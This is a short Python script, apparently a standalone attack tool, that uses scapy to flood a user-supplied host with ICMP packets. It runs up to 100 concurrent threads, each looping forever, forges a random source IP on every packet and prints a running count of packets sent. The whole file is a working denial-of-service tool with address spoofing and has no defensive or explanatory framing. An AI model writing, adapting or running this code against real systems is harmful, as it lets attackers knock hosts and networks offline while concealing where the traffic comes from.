from scapy.all import *
import threading
import socket
import time

sent = 0

active_threads = 0
max_threads = 100

def random_ip():
    ip = []
    for _ in range(4):
        ip.append(str(random.randrange(256)))
    ip = ".".join(ip)
    return ip

def icmp(host, packet_size=1000):
    try:
        global active_threads
        global sent
        active_threads += 1
        packet = IP(dst=host) / ICMP() / ("X" * packet_size)
        while True:
            packet[IP].src = random_ip()
            send(packet, verbose=0)
            sent += 1
    except Exception as e:
        print(f"icmp error: {e}")
        pass
    finally:
        active_threads -= 1

def verbose():
    while True:
        time.sleep(1)
        print(f"Sent -> {sent}")

host = input("Host: ")
packet_size = int(input("Size: "))
host = socket.gethostbyname(host)

threading.Thread(target=verbose, daemon=True).start()
while True:
    if active_threads >= max_threads:
        continue
    threading.Thread(target=icmp, args=[host, packet_size], daemon=True).start()
